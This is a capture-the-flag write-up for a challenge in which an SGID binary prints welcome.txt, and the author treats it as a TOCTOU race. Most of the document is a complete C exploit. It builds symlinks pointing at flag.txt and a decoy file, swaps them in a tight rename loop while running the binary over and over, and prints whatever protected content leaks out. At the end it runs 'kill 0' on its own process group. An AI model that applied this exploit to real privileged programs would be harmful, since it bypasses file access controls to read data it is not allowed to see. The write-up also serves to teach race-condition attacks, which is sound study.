## Challenge Overview

We are given a binary with the following permissions:

`-r-xr-s--x root flag_group challenge`


- The binary has the **SGID bit set**
- It runs with **group `flag_group` privileges**
- Direct access to the `flag.txt` is restricted


When executing the binary, we see:

The binary was openeing `welcome.txt` (present on same dir) and printing it's contents. However, we were unable to read flag.txt

Now it seems like typical TOCTOU vulenrability. so, below payload is created with a goal to read `flag.txt` (Isn't that the only goal rn ?). 

```c
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <stdlib.h>
#include <pthread.h>

void* race_thread(void* arg) {
    while (1) {
        rename("dabresirr", "tmp1");
        rename("welcome.txt", "dabresirr");
        rename("tmp1", "welcome.txt");
    }
    return NULL;
}

void* attack_thread(void* arg) {
    char buf[4096];

    for (int i = 0; i < 100000; i++) {
        FILE *p = popen("./challenge 2>/dev/null", "r");

        if (p) {
            while (fgets(buf, sizeof(buf), p)) {
                if (strstr(buf, "If you") != buf && strlen(buf) > 2) {
                    printf("FLAG: %s", buf);
                    fflush(stdout);
                }
            }
            pclose(p);
        }
    }

    system("kill 0");
    return NULL;
}

int main() {
    FILE *f = fopen("real.txt", "w");
    if (f) {
        fprintf(f, "hulululu\n");
        fclose(f);
    }

    unlink("dabresirr");
    unlink("welcome.txt");

    symlink("flag.txt", "dabresirr");
    symlink("real.txt", "welcome.txt");

    pthread_t t1, t2;

    pthread_create(&t1, NULL, race_thread, NULL);
    pthread_create(&t2, NULL, attack_thread, NULL);

    pthread_join(t1, NULL);
    pthread_join(t2, NULL);

    return 0;
}
```

what does the above code do ? 
It creates a decoy file (real.txt), a malicious symlink (dabresirr → flag.txt), and continuously swaps it with welcome.txt while running the program to trick it into reading the protected flag instead of the welcome file and rest is done by thread, ```Welcome to race condition```.

```Compile the above spell and execute to get your flag. ```
---
* [🔙 Back to Miscallaneous Directory](../)
* [🔙 Back to Miscellaneous Index Directory](../INDEX.md)
* [🔙 Back to Main Directory](../../README.md)
